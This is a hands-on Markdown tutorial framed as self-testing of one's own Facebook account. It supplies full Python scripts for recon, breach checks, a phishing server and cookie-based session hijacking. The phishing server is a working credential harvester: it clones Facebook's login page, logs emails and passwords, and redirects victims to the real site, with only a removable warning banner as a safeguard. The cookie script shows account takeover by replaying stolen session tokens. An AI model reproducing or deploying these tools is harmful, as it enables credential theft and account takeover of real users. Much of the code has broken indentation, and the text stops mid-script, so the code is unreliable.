# 🔐 Facebook Security Research — Complete Practical Guide
### Step-by-Step: How to Run Every Test, Where to Run It, What to Do

> **Your Setup:** Parrot OS laptop = attacker machine
> **Target:** Your OWN Facebook account and YOUR OWN group
> **Goal:** Understand every attack method hands-on, then defend against it

---

## 📚 Table of Contents

1. [Setup Your Lab First](#1-setup-your-lab)
2. [Understanding Facebook Security](#2-understanding-facebook-security)
3. [Reconnaissance — Step by Step](#3-reconnaissance)
4. [Phishing Attack — Build and Test](#4-phishing-attack)
5. [Session Hijacking — Practical](#5-session-hijacking)
6. [Password Attack — Test Your Own](#6-password-attack)
7. [Facebook Group Attack Simulation](#7-group-attack)
8. [API Token Testing](#8-api-token-testing)
9. [OSINT on Your Own Profile](#9-osint)
10. [Defense — Harden Everything](#10-defense)
11. [Bug Bounty Guide](#11-bug-bounty)

---

## 1. Setup Your Lab

### What You Need Before Starting

```
Your Parrot OS laptop (attacker)
Your phone with Facebook (target)
Both on same WiFi network

Software to install on Parrot OS:
- Python 3 (already installed)
- pip packages (we install below)
- Burp Suite (for intercepting traffic)
- Firefox (for testing)
```

### Install Everything First

```bash
# Open terminal on Parrot OS and run these commands:

# Update system
sudo apt update

# Install Python packages
pip3 install flask requests beautifulsoup4 python-dotenv

# Install Burp Suite Community (free)
sudo apt install burpsuite -y

# Install useful tools
sudo apt install -y curl wget nmap python3-pip

# Create a folder for all your Facebook research
mkdir -p ~/facebook_research
cd ~/facebook_research

# Create subfolders
mkdir phishing
mkdir session_tests
mkdir api_tests
mkdir osint
mkdir logs

echo "Lab setup complete!"
```

### How This Lab Works

```
The Attack Flow We Will Practice:

YOUR LAPTOP (Parrot OS)
┌─────────────────────────────────────┐
│  192.168.1.10                        │
│                                      │
│  Runs:                               │
│  - Phishing server (port 5000)       │
│  - Burp Suite proxy (port 8080)      │
│  - Python scripts                    │
└─────────────────────────────────────┘
↕ (same WiFi)
YOUR PHONE (Target)
┌─────────────────────────────────────┐
│  192.168.1.105                       │
│                                      │
│  Has:                                │
│  - Facebook app / browser            │
│  - Your Facebook account logged in   │
│  - Your Facebook group               │
└─────────────────────────────────────┘

INTERNET → Facebook servers (facebook.com)

You will:
1. Run attack tools on laptop
2. Be the "victim" on your phone
3. See exactly how attacks work
4. Learn how to defend
```

### Find Your Laptop's IP Address

```bash
# Run this on your Parrot OS laptop
ip addr show

# Look for line like:
# inet 192.168.1.10/24
# That number (192.168.1.10) is YOUR laptop's IP
# Write it down - you'll use it in all the tests

# Also find your phone's IP:
# On Android: Settings → WiFi → tap your network → IP address
# On iPhone: Settings → WiFi → tap (i) next to network → IP address
```

---

## 2. Understanding Facebook Security

### How Facebook Login Actually Works

```
When you open Facebook and log in:

STEP 1: You open facebook.com
Your browser → facebook.com servers
Facebook sends you the login page HTML

STEP 2: You type email + password
Browser sends:
POST https://www.facebook.com/login/
Body: email=you@gmail.com&pass=YourPassword

STEP 3: Facebook checks your password
Finds your account in database
Verifies password hash
If correct → creates a session

STEP 4: Facebook sends you cookies
Set-Cookie: c_user=YOUR_USER_ID
Set-Cookie: xs=ENCRYPTED_SESSION_TOKEN

These cookies = your "login ticket"
Every request to Facebook sends these cookies
Facebook checks: "Who has this ticket?" → You!

STEP 5: All future requests include cookies
GET https://www.facebook.com/feed
Cookie: c_user=123456; xs=abc123...

Facebook reads cookies → knows it's you → shows your feed

THE KEY INSIGHT:
If someone steals your cookies → they have your login ticket
They don't need your password!
They don't need your 2FA code!
They ARE you on Facebook until you change password or logout
```

### What the Cookies Look Like

```bash
# How to see your own Facebook cookies:

# Method 1: In Browser (Chrome/Firefox)
# 1. Open Chrome on your laptop
# 2. Log into Facebook
# 3. Press F12 (opens DevTools)
# 4. Click "Application" tab (Chrome) or "Storage" tab (Firefox)
# 5. Left sidebar: Cookies → https://www.facebook.com
# 6. Look for these important cookies:

# c_user = your Facebook user ID number
#          Example: c_user = 1234567890

# xs     = your session token (encrypted)
#          Example: xs = 2%3AaBcDeFgH...

# These two together = you are logged in
# Anyone with both can access your account from anywhere!
```

---

## 3. Reconnaissance — Step by Step

### Step 1: See What's Public on YOUR Profile

```bash
# Create the recon script
# On your Parrot OS, open terminal:

cd ~/facebook_research/osint
nano profile_recon.py
```

```python
# profile_recon.py
# WHAT IT DOES: Shows what public information is visible on your Facebook profile
# WHERE TO RUN: Your Parrot OS terminal
# HOW TO RUN: python3 profile_recon.py

import requests
from bs4 import BeautifulSoup
import json

def check_public_profile(username):
"""
Visits your Facebook profile as a stranger would see it.
Shows what information is publicly visible.

REPLACE 'your.username' with your actual Facebook username
(the part after facebook.com/ in your profile URL)
"""

print(f"\n{'='*60}")
print(f"RECON REPORT FOR: facebook.com/{username}")
print(f"{'='*60}\n")

url = f"https://www.facebook.com/{username}"

headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
	'Accept': 'text/html,application/xhtml+xml',
	'Accept-Language': 'en-US,en;q=0.9',
}

print(f"[*] Visiting: {url}")
print("[*] Simulating: A stranger visiting your profile\n")

try:
response = requests.get(url, headers=headers, timeout=15)
soup = BeautifulSoup(response.text, 'html.parser')

# Extract page title
title = soup.find('title')
if title:
	print(f"[+] Page Title: {title.text}")
	
	# Extract meta description (often shows bio/name)
	meta_desc = soup.find('meta', {'name': 'description'})
	if meta_desc:
		print(f"[+] Meta Description: {meta_desc.get('content', 'None')}")
		
		# Extract Open Graph data
		og_data = {}
		for tag in soup.find_all('meta'):
			prop = tag.get('property', '') or tag.get('name', '')
			if prop.startswith('og:'):
				og_data[prop] = tag.get('content', '')
				
				if og_data:
					print(f"\n[+] Open Graph Data (What other sites see):")
					for key, value in og_data.items():
						print(f"    {key}: {value}")
						
						print(f"\n[+] HTTP Status: {response.status_code}")
						print(f"[+] Page Size: {len(response.text)} characters")
						
						# Check if profile is public or private
						if 'timeline' in response.text.lower() or 'posts' in response.text.lower():
							print(f"\n[!] Profile appears to have PUBLIC content visible")
							else:
								print(f"\n[+] Profile content seems restricted (good!)")
								
								except Exception as e:
								print(f"[-] Error: {e}")
								
								# Manual checklist
								print(f"\n{'='*60}")
								print("MANUAL CHECK - Open these in your browser and note what's visible:")
								print(f"{'='*60}")
								print(f"""
								Visit as LOGGED OUT user (incognito window):
								URL: facebook.com/{username}
								
								Check what strangers can see:
								□ Full name visible?
								□ Profile picture visible?
								□ Cover photo visible?  
								□ Birthday visible? (DANGER - used in passwords!)
								□ Hometown visible? (DANGER - security question answer!)
								□ Workplace visible?
								□ Education visible?
								□ Family members visible? (DANGER - security questions!)
								□ Posts visible?
								□ Photos visible?
								□ Friends list visible?
								□ Groups visible?
								
								Each "YES" = information an attacker can use against you!
								""")
								
								# =============================================
								# HOW TO RUN:
								# 1. Save this file
								# 2. In terminal: python3 profile_recon.py
								# =============================================
								
								# CHANGE THIS to your Facebook username:
								MY_USERNAME = "your.facebook.username"
								
								print("\n[*] Facebook Profile Recon Tool")
								print("[*] Analyzing YOUR OWN profile for security research\n")
								
								check_public_profile(MY_USERNAME)
								```
								
								```bash
								# Save the file (Ctrl+X, Y, Enter in nano)
								# Then run it:
								python3 profile_recon.py
								```
								
								### Step 2: Check If Your Email Is in Breaches
								
								```bash
								cd ~/facebook_research/osint
								nano check_breaches.py
								```
								
								```python
								# check_breaches.py
								# WHAT IT DOES: Checks if your email/password appeared in known data breaches
								# If YES → hackers already know your password and can try it on Facebook!
								# WHERE TO RUN: Parrot OS terminal
								# HOW TO RUN: python3 check_breaches.py
								
								import requests
								import hashlib
								
								def check_email_in_breaches(email):
								"""
								Checks HaveIBeenPwned - a legitimate service that tracks breaches.
								If your email is there, attackers may already have your password!
								"""
								
								print(f"\n[*] Checking if {email} appears in data breaches...")
								
								url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
								headers = {
									'user-agent': 'FacebookSecurityResearch',
									'hibp-api-key': 'YOUR_FREE_API_KEY'  # Get free at haveibeenpwned.com/API
								}
								
								try:
								response = requests.get(url, headers=headers, timeout=10)
								
								if response.status_code == 200:
									breaches = response.json()
									print(f"\n[!!!] WARNING: Your email found in {len(breaches)} breaches!\n")
									
									for breach in breaches:
										print(f"  Breach: {breach['Name']}")
										print(f"  Date: {breach['BreachDate']}")
										print(f"  Data exposed: {', '.join(breach['DataClasses'])}")
										if 'Passwords' in breach['DataClasses']:
											print(f"  [!!!] PASSWORDS EXPOSED - Change Facebook password NOW!")
											print()
											
											elif response.status_code == 404:
											print(f"[+] GOOD: Email not found in known breaches!")
											print("    But still use a strong unique password.\n")
											
											elif response.status_code == 401:
											print("[-] Need API key - get free one at: haveibeenpwned.com/API/Key")
											print("    For now, check manually at: haveibeenpwned.com\n")
											
											except Exception as e:
											print(f"[-] Error checking: {e}")
											print("    Check manually at: haveibeenpwned.com\n")
											
											def check_password_in_breaches(password):
											"""
											Checks if your password appeared in breaches.
											SAFE: Only sends first 5 chars of hash (k-anonymity)
											Your real password NEVER leaves your computer!
											"""
											
											print(f"\n[*] Checking if your password appeared in breaches...")
											print("[*] SAFE: Only first 5 chars of hash sent (your password stays private)\n")
											
											# Hash the password with SHA1
											sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
											prefix = sha1[:5]   # Only send first 5 chars
											suffix = sha1[5:]   # Keep rest private
											
											url = f"https://api.pwnedpasswords.com/range/{prefix}"
											
											try:
											response = requests.get(url, timeout=10)
											
											for line in response.text.splitlines():
												hash_suffix, count = line.split(':')
												if hash_suffix == suffix:
													print(f"[!!!] DANGER: This password appeared in {count} breaches!")
													print(f"      Hackers definitely have this password in their lists!")
													print(f"      CHANGE YOUR FACEBOOK PASSWORD NOW!\n")
													return True
													
													print(f"[+] GOOD: Password not found in known breaches!")
													print("    Still, make sure it's strong and unique.\n")
													return False
													
													except Exception as e:
													print(f"[-] Error: {e}")
													
													# =============================================
													# HOW TO RUN THIS TEST:
													# 1. Replace with YOUR email and password
													# 2. Run: python3 check_breaches.py
													# =============================================
													
													print("=" * 60)
													print("BREACH CHECK - Testing Your Own Credentials")
													print("=" * 60)
													
													# REPLACE WITH YOUR OWN:
													MY_EMAIL = "your@email.com"
													MY_FACEBOOK_PASSWORD = "YourFacebookPassword123"
													
													check_email_in_breaches(MY_EMAIL)
													check_password_in_breaches(MY_FACEBOOK_PASSWORD)
													
													print("""
													WHAT THIS MEANS:
													If your email IS in breaches:
													→ Hackers have lists with your email
													→ They will try those breached passwords on Facebook
													→ If you reuse passwords → your Facebook is at RISK
													
													If your password IS in breaches:  
													→ This exact password is in hacker wordlists
													→ Any hacker trying credential stuffing will try it
													→ Change Facebook password IMMEDIATELY
													""")
													```
													
													```bash
													python3 check_breaches.py
													```
													
													---
													
													## 4. Phishing Attack — Build and Test
													
													### What We're Building
													
													```
													We build a FAKE Facebook login page
													You visit it on your PHONE
													You try to enter your Facebook credentials
													Your laptop captures them
													This shows EXACTLY how phishing works
													Then you'll know how to spot and avoid real phishing attacks
													```
													
													### Step 1: Create the Phishing Server
													
													```bash
													cd ~/facebook_research/phishing
													nano phishing_server.py
													```
													
													```python
													# phishing_server.py
													# WHAT IT DOES: Creates a fake Facebook login page on your laptop
													# WHERE TO RUN: Your Parrot OS terminal
													# HOW TO RUN: 
													#   1. python3 phishing_server.py
													#   2. On your phone: open browser, go to http://[LAPTOP_IP]:5000
													#   3. Try to enter your credentials
													#   4. Watch your laptop terminal capture them!
													# HOW TO STOP: Press Ctrl+C in terminal
													
													from flask import Flask, request, redirect, render_template_string
													import datetime
													import json
													import os
													
													app = Flask(__name__)
													
													# All captured credentials stored here
													captured_data = []
													
													# The fake Facebook login page
													# This looks EXACTLY like Facebook to test if you'd fall for it
													FAKE_FACEBOOK_HTML = """
													<!DOCTYPE html>
													<html lang="en">
													<head>
													<meta charset="UTF-8">
													<meta name="viewport" content="width=device-width, initial-scale=1.0">
													<title>Facebook - log in or sign up</title>
													<style>
													* {
														margin: 0;
														padding: 0;
														box-sizing: border-box;
													}
													
													body {
														background-color: #f0f2f5;
														font-family: Helvetica, Arial, sans-serif;
														display: flex;
														flex-direction: column;
														align-items: center;
														justify-content: center;
														min-height: 100vh;
														padding: 20px;
													}
													
													.main-container {
														display: flex;
														align-items: center;
														gap: 40px;
														max-width: 980px;
														width: 100%;
													}
													
													.left-section {
														flex: 1;
														padding-right: 20px;
													}
													
													.logo {
														color: #1877f2;
														font-size: 56px;
														font-weight: bold;
														line-height: 1;
														margin-bottom: 16px;
													}
													
													.tagline {
														font-size: 28px;
														line-height: 1.15;
														color: #1c1e21;
													}
													
													.right-section {
														width: 396px;
														flex-shrink: 0;
													}
													
													.login-card {
														background: white;
														border-radius: 8px;
														box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
														padding: 20px;
													}
													
													/* RESEARCH BANNER - shows this is YOUR test */
													.research-banner {
														background: #fff3cd;
														border: 2px solid #ffc107;
														border-radius: 6px;
														padding: 10px 14px;
														margin-bottom: 16px;
														font-size: 12px;
														color: #856404;
														line-height: 1.4;
													}
													
													.research-banner strong {
														display: block;
														margin-bottom: 4px;
													}
													
													.input-field {
														width: 100%;
														border: 1px solid #dddfe2;
														border-radius: 6px;
														font-size: 17px;
														padding: 14px 16px;
														margin-bottom: 12px;
														outline: none;
														color: #1c1e21;
													}
													
													.input-field:focus {
														border-color: #1877f2;
														box-shadow: 0 0 0 2px #e7f0ff;
													}
													
													.login-button {
														width: 100%;
														background: #1877f2;
														color: white;
														border: none;
														border-radius: 6px;
														font-size: 20px;
														font-weight: bold;
														padding: 14px;
														cursor: pointer;
														margin-bottom: 16px;
													}
													
													.login-button:hover {
														background: #166fe5;
													}
													
													.forgot-link {
														display: block;
														text-align: center;
														color: #1877f2;
														font-size: 14px;
														text-decoration: none;
														margin-bottom: 16px;
													}
													
													.divider {
														border: none;
														border-top: 1px solid #dadde1;
														margin: 16px 0;
													}
													
													.create-button {
														display: block;
														width: fit-content;
														margin: 0 auto;
														background: #42b72a;
														color: white;
														border: none;
														border-radius: 6px;
														font-size: 17px;
														font-weight: bold;
														padding: 14px 24px;
														cursor: pointer;
													}
													
													/* Mobile responsive */
													@media (max-width: 768px) {
														.main-container {
															flex-direction: column;
															align-items: center;
														}
														.left-section {
															text-align: center;
															padding-right: 0;
														}
														.logo { font-size: 40px; }
														.tagline { font-size: 20px; }
														.right-section { width: 100%; max-width: 396px; }
													}
													</style>
													</head>
													<body>
													<div class="main-container">
													<div class="left-section">
													<div class="logo">facebook</div>
													<p class="tagline">Connect with friends and the world around you on Facebook.</p>
													</div>
													
													<div class="right-section">
													<div class="login-card">
													
													<!-- Research Notice (ONLY for your own testing!) -->
													<!-- In a REAL phishing attack, this warning would NOT be here! -->
													<div class="research-banner">
													<strong>⚠️ SECURITY RESEARCH TEST</strong>
													This is YOUR fake login page running on your laptop.
													In a real phishing attack, there would be NO warning here.
													Check the URL bar on your phone - it's NOT facebook.com!
													</div>
													
													<form method="POST" action="/login">
													<input 
													class="input-field" 
													type="text" 
													name="email" 
													placeholder="Email address or phone number"
													autocomplete="email"
													>
													<input 
													class="input-field" 
													type="password" 
													name="password" 
													placeholder="Password"
													autocomplete="current-password"
													>
													<button type="submit" class="login-button">Log in</button>
													</form>
													
													<a href="#" class="forgot-link">Forgotten password?</a>
													
													<hr class="divider">
													
													<button class="create-button">Create new account</button>
													</div>
													</div>
													</div>
													</body>
													</html>
													"""
													
													# Results page to see what was captured
													RESULTS_HTML = """
													<!DOCTYPE html>
													<html>
													<head>
													<title>Phishing Research Results</title>
													<style>
													body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
													h1 { color: #ff6600; margin-bottom: 20px; }
													.entry { background: #2a2a2a; border: 1px solid #00ff00; padding: 15px; margin: 10px 0; border-radius: 5px; }
													.label { color: #ff6600; }
													.danger { color: #ff0000; font-weight: bold; }
													.url { color: #4488ff; }
													</style>
													</head>
													<body>
													<h1>🎣 Phishing Research - Captured Data</h1>
													<p>Total captured: <span class="danger">{{ count }}</span></p>
													<br>
													{% for entry in entries %}
													<div class="entry">
													<p><span class="label">Time:</span> {{ entry.timestamp }}</p>
													<p><span class="label">From IP:</span> {{ entry.ip }}</p>
													<p><span class="label">Device:</span> {{ entry.user_agent[:80] }}</p>
													<p><span class="label">Email entered:</span> <span class="danger">{{ entry.email }}</span></p>
													<p><span class="label">Password entered:</span> <span class="danger">{{ entry.password }}</span></p>
													</div>
													{% endfor %}
													
													{% if count == 0 %}
													<p>No credentials captured yet. Visit <span class="url">http://LAPTOP_IP:5000</span> on your phone and try logging in!</p>
													{% endif %}
													</body>
													</html>
													"""
													
													@app.route('/')
													def fake_login():
													"""Serve the fake Facebook login page"""
													print(f"[*] Someone visited the phishing page from: {request.remote_addr}")
													return render_template_string(FAKE_FACEBOOK_HTML)
													
													@app.route('/login', methods=['POST'])
													def capture_credentials():
													"""Capture credentials when form is submitted"""
													
													email = request.form.get('email', '')
													password = request.form.get('password', '')
													timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
													ip = request.remote_addr
													user_agent = request.headers.get('User-Agent', '')
													
													# Store captured data
													entry = {
														'timestamp': timestamp,
														'ip': ip,
														'user_agent': user_agent,
														'email': email,
														'password': password
													}
													captured_data.append(entry)
													
													# Print to terminal (attacker's screen)
													print(f"\n{'='*60}")
													print(f"🎣 CREDENTIALS CAPTURED!")
													print(f"{'='*60}")
													print(f"  Time:      {timestamp}")
													print(f"  From IP:   {ip}")
													print(f"  Device:    {user_agent[:60]}...")
													print(f"  Email:     {email}")
													print(f"  Password:  {password}")
													print(f"{'='*60}\n")
													print(f"[*] Now redirecting victim to real Facebook (they don't notice!)")
													
													# Save to log file
													with open('captured_credentials.txt', 'a') as f:
													f.write(json.dumps(entry) + '\n')
													
													# Redirect to real Facebook (victim thinks login just worked!)
													return redirect('https://www.facebook.com')
													
													@app.route('/results')
													def show_results():
													"""Show what was captured - only you can access this on localhost"""
													return render_template_string(RESULTS_HTML, 
																				  entries=captured_data, 
										   count=len(captured_data))
													
													if __name__ == '__main__':
														import socket
														
														# Get laptop's IP
														hostname = socket.gethostname()
														local_ip = socket.gethostbyname(hostname)
														
														print("=" * 60)
														print("PHISHING RESEARCH SERVER")
														print("=" * 60)
														print(f"\n[*] Server starting on: http://0.0.0.0:5000")
														print(f"[*] Your laptop's IP appears to be: {local_ip}")
														print(f"\n[*] On your PHONE, open browser and visit:")
														print(f"    http://{local_ip}:5000")
														print(f"\n[*] To see captured credentials:")
														print(f"    http://localhost:5000/results  (on laptop only)")
														print(f"\n[*] Captured credentials also saved to: captured_credentials.txt")
														print(f"\n[!] OBSERVE ON YOUR PHONE:")
														print(f"    - The URL is NOT facebook.com!")
														print(f"    - It shows your laptop's IP address")
														print(f"    - But the page LOOKS exactly like Facebook")
														print(f"    - Most users wouldn't notice the URL!")
														print(f"\n[*] Press Ctrl+C to stop server\n")
														
														app.run(host='0.0.0.0', port=5000, debug=False)
														```
														
														### Step 2: Run the Phishing Test
														
														```bash
														# Terminal 1 on your Parrot OS:
														cd ~/facebook_research/phishing
														python3 phishing_server.py
														
														# You'll see output like:
														# ============================================================
														# PHISHING RESEARCH SERVER
														# ============================================================
														# [*] Server starting on: http://0.0.0.0:5000
														# [*] Your laptop's IP appears to be: 192.168.1.10
														# [*] On your PHONE, open browser and visit:
														#     http://192.168.1.10:5000
														
														# --------------------------------------------------------
														# NOW ON YOUR PHONE:
														# --------------------------------------------------------
														# 1. Open Chrome or any browser on your phone
														# 2. Type in address bar: http://192.168.1.10:5000
														#    (use YOUR laptop's actual IP from above)
														# 3. You'll see a Facebook login page
														# 4. Type any email and password (your real ones or fake ones)
														# 5. Press "Log in"
														# 6. Page redirects to real Facebook (victim never notices!)
														
														# --------------------------------------------------------
														# BACK ON YOUR LAPTOP TERMINAL:
														# --------------------------------------------------------
														# You'll immediately see:
														# ============================================================
														# CREDENTIALS CAPTURED!
														# ============================================================
														#   Time:     2024-01-15 14:30:22
														#   From IP:  192.168.1.105 (your phone!)
														#   Email:    whatever@you.typed
														#   Password: WhateverYouTyped
														# ============================================================
														
														# To see results in browser (on laptop):
														# Open: http://localhost:5000/results
														```
														
														### Step 3: What You Learn From This Test
														
														```
														WHAT JUST HAPPENED:
														1. You visited a page that LOOKS like Facebook
														2. You entered credentials
														3. Your laptop captured them INSTANTLY
														4. You were redirected to real Facebook
														5. Without the warning banner, you might not have noticed!
														
														HOW REAL PHISHING DIFFERS:
														Real phishing: 
														- Page is hosted online (not your laptop)
														- URL looks convincing: faceb00k.com, facebook-login.com, fb-verify.xyz
														- NO warning banner
														- Sent via: email, SMS, WhatsApp, fake Facebook notification
														
														WHAT HACKERS DO WITH CAPTURED CREDENTIALS:
														1. Login to your Facebook immediately
														2. Change password and email (lock you out)
														3. Access your Messenger, photos, groups
														4. Use your account to phish YOUR friends
														
														HOW TO NEVER FALL FOR IT:
														✓ ALWAYS check the URL before entering password
														✓ URL MUST be exactly: facebook.com (nothing else!)
														✓ facebook.com = REAL
														✓ faceb00k.com = FAKE
														✓ facebook-security.com = FAKE
														✓ facebook.loginverify.com = FAKE
														✓ Only the part BEFORE .com matters:
														facebook.com/login = REAL (facebook is before .com)
														facebook.com.verify.xyz/login = FAKE (xyz is before .com)
														✓ Install browser extension: "Google Safe Browsing"
														✓ Use hardware security key (makes phishing impossible)
														```
														
														---
														
														## 5. Session Hijacking — Practical
														
														### Step 1: Extract Your Own Cookies
														
														```
														ON YOUR LAPTOP (using Chrome):
														
														1. Open Chrome
														2. Go to facebook.com and login
														3. Press F12 to open DevTools
														4. Click "Application" tab
														5. Left sidebar: expand "Cookies"
														6. Click "https://www.facebook.com"
														7. Look for these cookies:
														
														NAME        | VALUE
														------------|------------------------------------------
														c_user      | 1234567890  (your user ID)
														xs          | 2%3AaBcDeFgHiJkLmN...  (session token)
														datr        | AbCdEfGhIjKl...  (device recognition)
														
														8. Right-click on "xs" cookie → Copy value
														9. Right-click on "c_user" cookie → Copy value
														```
														
														### Step 2: Test Cookie-Based Login
														
														```bash
														cd ~/facebook_research/session_tests
														nano session_test.py
														```
														
														```python
														# session_test.py
														# WHAT IT DOES: Tests if stolen cookies can be used to login
														# Shows why cookie theft = account takeover
														# WHERE TO RUN: Parrot OS terminal
														# HOW TO RUN: python3 session_test.py
														# BEFORE RUNNING: Extract your own cookies from browser (see instructions above)
														
														import requests
														import json
														
														def test_session_with_cookies(c_user, xs_cookie):
														"""
														Tests if Facebook cookies are valid for authentication.
														Use YOUR OWN cookies extracted from your browser.
														This proves that cookie theft = account access.
														"""
														
														print(f"\n{'='*60}")
														print("SESSION HIJACKING TEST")
														print("Using YOUR OWN cookies to prove the attack works")
														print(f"{'='*60}\n")
														
														session = requests.Session()
														
														# Set the stolen cookies
														session.cookies.set('c_user', c_user, domain='.facebook.com')
														session.cookies.set('xs', xs_cookie, domain='.facebook.com')
														session.cookies.set('locale', 'en_US', domain='.facebook.com')
														
														headers = {
															'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
															'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
															'Accept-Language': 'en-US,en;q=0.9',
															'Sec-Fetch-Mode': 'navigate',
														}
														
														print(f"[*] Testing cookies for user ID: {c_user}")
														print(f"[*] Session token (xs): {xs_cookie[:20]}...")
														print(f"\n[*] Sending request to Facebook without password...\n")
														
														try:
														# Try to access Facebook with just cookies
														response = session.get(
															'https://www.facebook.com', 
									 headers=headers, 
									 timeout=15,
									 allow_redirects=True
														)
														
														print(f"[*] Response status: {response.status_code}")
														print(f"[*] Response URL: {response.url}")
														
														# Check if we're logged in
														if any(indicator in response.text for indicator in [
															'"isLoggedIn":true',
					 'logout',
					 'Log Out',
					 c_user,
					 '"USER_ID"'
														]):
														print(f"\n[!!!] SUCCESS: LOGGED IN WITH JUST COOKIES!")
														print(f"[!!!] No password needed!")
														print(f"[!!!] No 2FA needed!")
														print(f"[!!!] This is how session hijacking works!\n")
														
														# Try to get basic profile info
														print(f"[*] Trying to access profile data...")
														
														elif 'login' in response.url or 'checkpoint' in response.url:
														print(f"\n[+] Cookies are invalid or expired")
														print(f"[+] You would need to get fresh cookies")
														print(f"[+] (Login again on Facebook to get new cookies)\n")
														
														else:
															print(f"\n[?] Unclear result - check manually")
															print(f"[?] URL: {response.url}\n")
															
															# Try Graph API with cookies
															print(f"[*] Testing Graph API access with cookies...")
															api_response = session.get(
																'https://www.facebook.com/me',
										  headers={**headers, 'Accept': 'application/json'},
										  timeout=15
															)
															
															if api_response.status_code == 200:
																print(f"[+] API accessible with cookies!")
																
																except requests.exceptions.Timeout:
																print(f"[-] Request timed out")
																except requests.exceptions.ConnectionError:
																print(f"[-] Connection error - check internet")
																except Exception as e:
																print(f"[-] Error: {e}")
																
																print(f"\n{'='*60}")
																print("WHAT THIS TEST PROVES:")
																print(f"{'='*60}")
																print("""
																1. Cookies = Login tickets
																2. Anyone with your cookies can access your account
																3. No password required
																4. No 2FA required  
																5. This is why these attacks are so dangerous:
																
																MALWARE on your PC → steals cookies → account taken over
																PUBLIC WIFI MITM   → captures cookies → account taken over
																XSS ATTACK         → JavaScript reads cookies → account taken over
																EVIL EXTENSION     → browser reads cookies → account taken over
																
																HOW TO PROTECT YOURSELF:
																✓ Never save passwords in browser on public computers
																✓ Always use HTTPS (never HTTP)
																✓ Don't install browser extensions you don't trust
																✓ Use antivirus to prevent malware
																✓ Log out of Facebook after using on shared computers
																✓ Check active sessions: Settings → Security → Active Sessions
																✓ Enable login alerts so you know if someone gets in
																""")
																
																# ================================================
																# HOW TO GET YOUR OWN COOKIES:
																# 1. Open Chrome on laptop
																# 2. Go to facebook.com, login
																# 3. Press F12
																# 4. Application tab → Cookies → facebook.com
																# 5. Copy "c_user" value (your user ID number)
																# 6. Copy "xs" value (the session token)
																# 7. Paste them below
																# ================================================
																
																# REPLACE WITH YOUR ACTUAL COOKIE VALUES:
																MY_C_USER = "1234567890"          # Your Facebook user ID
																MY_XS = "2%3AaBcDeFgHiJkLmN..."  # Your xs cookie value
																
																test_session_with_cookies(MY_C_USER, MY_XS)
																```
																
																```bash
																# Replace the cookie values in the script first, then run:
																python3 session_test.py
																```
																
																---
																
																## 6. Password Attack — Test Your Own
																
																### Test Your Password Strength
																
																```bash
																cd ~/facebook_research
																nano password_test.py
																```
																
																```python
																# password_test.py
																# WHAT IT DOES: Tests how strong YOUR Facebook password actually is
																# Shows how fast an attacker could crack it
																# WHERE TO RUN: Parrot OS terminal
																# HOW TO RUN: python3 password_test.py
																
																import string
																import time
																import hashlib
																import math
																
																def analyze_password_strength(password):
																"""
																Analyzes your password and shows how easy it would be to crack.
																"""
																
																print(f"\n{'='*60}")
																print("PASSWORD STRENGTH ANALYSIS")
																print(f"{'='*60}\n")
																
																print(f"[*] Analyzing password: {'*' * len(password)} ({len(password)} chars)")
																print()
																
																# Check character set
																has_lower = any(c in string.ascii_lowercase for c in password)
																has_upper = any(c in string.ascii_uppercase for c in password)
																has_digits = any(c in string.digits for c in password)
																has_special = any(c in string.punctuation for c in password)
																
																# Calculate character set size
																charset_size = 0
																if has_lower:
																	charset_size += 26
																	print("[+] Contains lowercase letters (+26)")
																	else:
																		print("[-] Missing lowercase letters")
																		
																		if has_upper:
																			charset_size += 26
																			print("[+] Contains uppercase letters (+26)")
																			else:
																				print("[-] Missing uppercase letters")
																				
																				if has_digits:
																					charset_size += 10
																					print("[+] Contains numbers (+10)")
																					else:
																						print("[-] Missing numbers")
																						
																						if has_special:
																							charset_size += 32
																							print("[+] Contains special chars (+32)")
																							else:
																								print("[-] Missing special characters")
																								
																								# Calculate entropy
																								if charset_size > 0:
																									entropy = len(password) * math.log2(charset_size)
																									else:
																										entropy = 0
																										
																										print(f"\n[*] Password length: {len(password)} characters")
																										print(f"[*] Character set size: {charset_size}")
																										print(f"[*] Password entropy: {entropy:.1f} bits")
																										
																										# Calculate possible combinations
																										combinations = charset_size ** len(password)
																										
																										# GPU cracking speeds (realistic 2024 values for bcrypt)
																										# Facebook uses bcrypt, NOT fast hashes
																										bcrypt_attempts_per_second = 10000  # With GPU, bcrypt is slow
																										
																										# Worst case: attacker needs to try all combinations
																										max_seconds = combinations / bcrypt_attempts_per_second
																										
																										print(f"\n[*] Total possible passwords: {combinations:,.0f}")
																										print(f"[*] Cracking speed (bcrypt, GPU): {bcrypt_attempts_per_second:,}/second")
																										
																										# Convert to human-readable time
																										def seconds_to_readable(seconds):
																										if seconds < 60:
																											return f"{seconds:.1f} seconds"
																											elif seconds < 3600:
																											return f"{seconds/60:.1f} minutes"
																											elif seconds < 86400:
																											return f"{seconds/3600:.1f} hours"
																											elif seconds < 86400*365:
																											return f"{seconds/86400:.1f} days"
																											elif seconds < 86400*365*100:
																											return f"{seconds/(86400*365):.1f} years"
																											else:
																												return f"{seconds/(86400*365*1000):.0f} thousand years"
																												
																												worst_case = seconds_to_readable(max_seconds)
																												average_case = seconds_to_readable(max_seconds / 2)
																												
																												print(f"\n[*] Time to crack (worst case):  {worst_case}")
																												print(f"[*] Time to crack (average case): {average_case}")
																												
																												# Rating
																												print(f"\n{'='*60}")
																												if entropy < 28:
																													print("RATING: 💀 EXTREMELY WEAK - Change immediately!")
																													elif entropy < 36:
																													print("RATING: 🔴 WEAK - Vulnerable to attacks")
																													elif entropy < 60:
																													print("RATING: 🟡 MODERATE - OK but could be better")
																													elif entropy < 80:
																													print("RATING: 🟢 STRONG - Good protection")
																													else:
																														print("RATING: ✅ VERY STRONG - Excellent!")
																														print(f"{'='*60}")
																														
																														# Common pattern checks
																														print("\n[*] Checking for common weak patterns...")
																														
																														weak_patterns = []
																														
